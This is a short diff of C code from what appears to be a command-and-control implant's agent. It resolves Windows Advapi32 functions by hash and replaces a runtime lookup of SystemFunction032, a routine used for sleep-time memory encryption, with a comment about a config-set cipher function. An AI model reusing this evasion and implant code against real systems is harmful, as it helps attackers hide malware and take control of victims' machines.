@@ -37,7 +37,7 @@ BOOL RtAdvapi32(
         Instance->Win32.OpenProcessToken             = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
         Instance->Win32.AdjustTokenPrivileges        = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
         Instance->Win32.LookupPrivilegeNameA         = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
-        Instance->Win32.SystemFunction032            = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
+        /* SleepCipherFunc is set in DemonInit after config parse - no runtime DLL resolution needed */
         Instance->Win32.FreeSid                      = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_FREESID );
         Instance->Win32.SetSecurityDescriptorSacl    = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORSACL );
         Instance->Win32.SetSecurityDescriptorDacl    = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORDACL );
